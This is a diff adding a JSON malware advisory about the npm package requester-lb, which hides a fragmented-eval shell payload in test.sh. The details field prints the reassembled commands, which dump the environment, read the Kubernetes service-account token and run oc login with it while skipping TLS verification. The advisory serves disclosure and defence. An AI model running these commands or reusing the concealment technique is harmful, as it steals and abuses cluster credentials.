@@ -1,0 +1,61 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-14323",
+  "modified": "2026-11-19T13:37:42Z",
+  "published": "2026-11-19T13:36:57Z",
+  "summary": "Malicious code in requester-lb (npm)",
+  "details": "This package ships a shell script, package/test.sh, that hides its payload by splitting command strings into seventeen single-fragment shell variables (\"a=pri; b=nte; c=nv\", etc.) and reassembling them with two eval calls so that no readable command appears in the file. Reassembled, the script runs printenv to dump the full environment, then `export DEBUG_FILE=$(cat /var/run/secrets/kubernetes[.]io/serviceaccount/token 2\u003e/dev/null)` to read the Kubernetes service-account token from its in-cluster mount point, then executes `./oc login --token=$DEBUG_FILE --server=$SERV --insecure-skip-tls-verify`, authenticating to a cluster supplied by the operator using the stolen token while disabling TLS verification. The package's other entry point, requester.js, is a benign HTTP/DNS diagnostic CLI, and the bundled DISCLOSURE and README describe only hostname/diagnostic network traffic and never mention reading the service-account token or invoking oc login. The command-and-control server is not hardcoded; it is taken from the $SERV environment variable at run time, so the tarball contains no fixed network IOC. Artifacts: package/test.sh (fragmented eval payload), target file /var/run/secrets/kubernetes[.]io/serviceaccount/token, environment variable $SERV, and the resulting oc CLI login.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "requester-lb",
+        "purl": "pkg:npm/requester-lb"
+      },
+      "versions": [
+        "1.0.13"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/requester-lb/v/1.0.13"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-14323"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-11-19T13:36:57Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "kubernetes[.]io"
+        ],
+        "sha256": [
+          "b752868a49c7dfa160a6c5b9c2c4270d508da205289a20ac3b10a3ba66a72e32"
+        ]
+      }
+    }
+  }
+}
